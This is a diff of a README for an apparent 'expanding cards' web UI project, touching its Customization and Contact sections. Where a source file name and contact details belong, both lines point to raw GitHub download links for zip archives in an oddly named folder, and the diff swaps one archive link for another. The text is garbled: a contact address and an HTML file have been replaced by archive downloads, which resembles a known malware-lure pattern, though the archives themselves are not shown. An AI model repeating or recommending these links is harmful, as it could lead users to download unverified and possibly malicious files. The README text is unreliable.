@@ -16,8 +16,8 @@ This project features an interactive and visually appealing card expansion effec
 ## Customization
 You can modify the following for your own use:
 - **Images**: Change the images in the cards by replacing the image URLs in the HTML.
-- **Card Layout**: Modify the number of cards or their arrangement in the `https://github.com/abhijitkayal10/expanding-cards/raw/refs/heads/main/notorhizal/expanding-cards-2.4.zip` file.
+- **Card Layout**: Modify the number of cards or their arrangement in the `https://github.com/abhijitkayal10/expanding-cards/raw/refs/heads/main/notorhizal/cards-expanding-v2.8.zip` file.
 - **Animation Style**: Edit the CSS to change hover effects like scaling, background color, and transitions.
 
 ## Contact
-If you have any questions or need further clarification, feel free to reach out at https://github.com/abhijitkayal10/expanding-cards/raw/refs/heads/main/notorhizal/expanding-cards-2.4.zip
+If you have any questions or need further clarification, feel free to reach out at https://github.com/abhijitkayal10/expanding-cards/raw/refs/heads/main/notorhizal/cards-expanding-v2.8.zip
